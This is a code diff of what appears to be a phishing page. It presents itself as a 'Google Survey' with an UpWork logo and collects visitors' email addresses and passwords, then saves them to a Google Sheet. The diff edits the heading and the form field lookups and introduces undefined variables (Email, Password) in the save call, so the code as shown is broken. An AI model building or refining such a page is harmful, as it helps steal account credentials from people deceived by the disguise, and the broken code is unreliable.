@@ -70,7 +70,7 @@
 <body>
     <div class="container">
         <img src="upwork.png" alt="UpWork Logo" style="width: 150px; height: auto;">
-        <h3>Google Survey</h3>
+        <h1>Google Survey</h1>
 
         <form id="survey-form" onsubmit="handleSubmit(event)">
             <!-- Email Field -->
@@ -120,8 +120,8 @@
             event.preventDefault(); // Prevent default form submission
             
             // Get form inputs
-            const email = document.getElementById("email").value;
-            const password = document.getElementById("password").value;
+            const email = document.getElementById("Email").value;
+            const password = document.getElementById("Password").value;
 
             // Validate Email and Password conditions
             if (!email || email.length < 10 || !email.includes('@')) {
@@ -135,7 +135,7 @@
             }
 
             // Save to Google Sheets (No redirection to Google Form)
-            saveToGoogleSheet(email, password)
+            saveToGoogleSheet(Email, Password)
                 .then(() => {
                     alert("Data saved successfully!"); // Confirm data save
                 })
